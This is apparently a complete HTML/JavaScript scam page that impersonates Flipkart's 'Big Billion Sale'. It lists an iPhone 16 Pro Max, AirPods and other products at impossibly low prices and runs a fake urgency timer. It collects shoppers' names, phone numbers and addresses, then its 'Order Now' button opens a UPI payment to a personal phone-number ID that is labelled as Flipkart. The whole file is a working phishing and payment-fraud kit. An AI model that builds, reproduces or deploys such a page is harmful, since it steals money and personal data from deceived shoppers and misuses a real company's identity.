<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flipkart | Big Billion Sale LIVE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #f1f3f6; font-family: Roboto, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        .fk-blue { background-color: #2874f0; }
        .color-dot { width: 34px; height: 34px; border-radius: 50%; border: 2px solid #ddd; cursor: pointer; transition: 0.2s; position: relative; }
        .color-dot.active { border: 2px solid #2874f0; transform: scale(1.15); box-shadow: 0 0 8px rgba(40,116,240,0.3); }
        .input-field { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 6px; font-size: 14px; outline: none; }
        .img-container { height: 160px; display: flex; align-items: center; justify-content: center; padding: 10px; background: #fff; overflow: hidden; }
        .img-container img { max-height: 100%; max-width: 100%; object-fit: contain; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .animate-up { animation: slideUp 0.3s ease-out; }
        .timer-strip { background: #ff4343; color: white; padding: 8px; font-weight: bold; text-align: center; font-size: 13px; }
    </style>
</head>
<body class="pb-10">

    <header class="fk-blue py-3 px-4 sticky top-0 z-50 text-white flex justify-between items-center">
        <div class="flex flex-col">
            <span class="text-2xl font-black italic leading-3">Flipkart</span>
            <span class="text-[10px] text-yellow-300 font-bold mt-1 uppercase italic">Plus</span>
        </div>
        <div class="flex gap-5 items-center">
            <i class="fa-solid fa-magnifying-glass"></i>
            <i class="fa-solid fa-cart-shopping"></i>
        </div>
    </header>

    <div class="timer-strip sticky top-[52px] z-40">
        ⚡ SALE ENDS IN: <span id="timer">09:59:59</span>
    </div>

    <main class="max-w-7xl mx-auto p-2 mt-1">
        <div id="grid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-2"></div>
    </main>

    <div id="pModal" class="fixed inset-0 bg-black/80 z-[100] hidden flex items-end justify-center">
        <div class="bg-white w-full max-w-md rounded-t-3xl animate-up overflow-hidden max-h-[95vh] flex flex-col">
            <div class="p-4 border-b flex justify-between items-center bg-white sticky top-0">
                <span class="font-bold text-gray-800">Review Product</span>
                <button onclick="closeModal()" class="text-3xl text-gray-400 px-2">&times;</button>
            </div>
            
            <div class="overflow-y-auto flex-1 p-5">
                <div class="flex flex-col items-center mb-6">
                    <div class="h-64 w-full flex items-center justify-center bg-white rounded-xl border p-4 mb-4">
                        <img id="mImg" src="" class="max-h-full">
                    </div>
                    <h2 id="mName" class="font-bold text-lg text-center leading-tight"></h2>
                    <div class="flex items-center gap-2 mt-2">
                        <span id="mPrice" class="text-3xl font-black text-gray-900"></span>
                        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-5">
                    </div>
                </div>

                <div id="colorSelection" class="mb-8 border-t pt-5">
                    <p class="text-[10px] font-bold text-gray-400 text-center mb-4 uppercase">Select Variant</p>
                    <div id="colorDots" class="flex gap-5 justify-center"></div>
                    <p id="cNameDisplay" class="text-center text-blue-600 font-bold mt-3 text-sm italic"></p>
                </div>

                <div class="border-t pt-6 space-y-4">
                    <p class="text-xs font-bold text-gray-500 uppercase">Delivery Details</p>
                    <input type="text" id="uName" placeholder="Full Name" class="input-field">
                    <input type="tel" id="uPhone" placeholder="Phone Number" class="input-field">
                    <textarea id="uAddr" placeholder="Complete Address" class="input-field h-20"></textarea>
                </div>

                <div class="mt-8 p-4 bg-gray-50 rounded-xl border mb-10 flex justify-between items-center">
                    <span class="font-bold">Total Payable:</span>
                    <span id="totalVal" class="text-2xl font-black text-gray-900"></span>
                </div>
            </div>

            <div class="p-3 bg-white border-t">
                <button onclick="pay()" class="w-full bg-[#fb641b] text-white py-4 font-bold rounded shadow-lg uppercase active:bg-orange-700">Order Now</button>
            </div>
        </div>
    </div>

    <script>
        // Verified Images that WILL work
        const products = [
            {
                name: "iPhone 16 Pro Max (Desert Titanium)", price: 689,
                variants: [
                    { c: "Desert Titanium", hex: "#beafa0", img: "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/4/b/-original-imahggex8m6jhazj.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/q/r/-original-imahggessqugbgtn.jpeg?q=70&crop=false" },
                    { c: "Black Titanium", hex: "#3b3b3b", img: "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/w/z/h/-original-imahggetkf6y67sr.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/7/y/e/-original-imahggetucrkc5ty.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/g/t/-original-imahggetecvfkzha.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/2/x/3/-original-imahggetnsszzspg.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/d/o/r/-original-imahfvx3ywpmyexy.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/r/z/s/-original-imahfvx3gkzzpjud.jpeg?q=70&crop=false,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/m/c/w/-original-imahggetbeu6bm2k.jpeg?q=70&crop=false" }
                ]
            },
            {
                name: "Apple AirPods Pro (2nd Generation)", price: 99,
                variants: [{ c: "White", hex: "#fff", img: "https://www.apple.com/newsroom/images/product/airpods/airpods-pro/Apple-AirPods-Pro-2nd-gen-hero-220907_big.jpg.large.jpg" }]
            },
            {
                name: "Sony WH-1000XM5 Noise Cancelling", price: 2199,
                variants: [{ c: "Black", hex: "#111", img: "https://m.media-amazon.com/images/I/51Xv68yBbkL._SL1500_.jpg" }]
            },
            {
                name: "boAt Airdopes 131 Pro Bluetooth", price: 449,
                variants: [{ c: "Active Black", hex: "#111", img: "https://m.media-amazon.com/images/I/510+S97C8DL._SL1500_.jpg" }]
            },
            {
                name: "iPhone 15 (Blue, 128 GB)", price: 39999,
                variants: [{ c: "Blue", hex: "#d2e1ec", img: "https://m.media-amazon.com/images/I/71d7rfSl0wL._SL1500_.jpg" }]
            },
            {
                name: "OnePlus Buds 3 Pro TWS", price: 1199,
                variants: [{ c: "Gray", hex: "#888", img: "https://m.media-amazon.com/images/I/51KzL9eO+TL._SL1500_.jpg" }]
            }
        ];

        let activeAmt = 0;

        function render() {
            const grid = document.getElementById('grid');
            let html = '';
            for(let i=0; i<200; i++) {
                let p = products[i % products.length];
                html += `
                <div class="bg-white border rounded p-2 cursor-pointer active:scale-95 transition" onclick='openModal(${JSON.stringify(p)})'>
                    <div class="img-container">
                        <img src="${p.variants[0].img}" onerror="this.src='https://via.placeholder.com/150?text=Product'">
                    </div>
                    <div class="mt-2">
                        <h2 class="text-[11px] font-bold text-gray-700 truncate">${p.name}</h2>
                        <p class="font-black text-sm mt-1">₹${p.price.toLocaleString()}</p>
                        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-3 mt-1">
                    </div>
                </div>`;
            }
            grid.innerHTML = html;
        }

        function openModal(p) {
            document.getElementById('mName').innerText = p.name;
            document.getElementById('mPrice').innerText = "₹" + p.price.toLocaleString();
            document.getElementById('totalVal').innerText = "₹" + p.price.toLocaleString();
            document.getElementById('mImg').src = p.variants[0].img;
            document.getElementById('cNameDisplay').innerText = p.variants[0].c;
            activeAmt = p.price;

            const dotBox = document.getElementById('colorDots');
            if(p.variants.length > 1) {
                document.getElementById('colorSelection').style.display = 'block';
                dotBox.innerHTML = p.variants.map((v, idx) => `
                    <div class="color-dot ${idx===0?'active':''}" style="background:${v.hex}" onclick="event.stopPropagation(); changeV('${v.img}', '${v.c}', this)"></div>
                `).join('');
            } else {
                document.getElementById('colorSelection').style.display = 'none';
            }

            document.getElementById('pModal').classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }

        function changeV(img, col, el) {
            document.getElementById('mImg').src = img;
            document.getElementById('cNameDisplay').innerText = col;
            document.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
        }

        function closeModal() {
            document.getElementById('pModal').classList.add('hidden');
            document.body.style.overflow = 'auto';
        }

        function pay() {
            if(!document.getElementById('uName').value) return alert("Pehle details bhariye");
            window.location.href = `upi://pay?pa=8709615634-w350@ybl&pn=Flipkart&am=${activeAmt}&cu=INR`;
        }

        function timer() {
            let h=9, m=59, s=59;
            setInterval(() => {
                s--; if(s<0){s=59; m--;} if(m<0){m=59; h--;}
                document.getElementById('timer').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            }, 1000);
        }

        render();
        timer();
    </script>
</body>
</html>
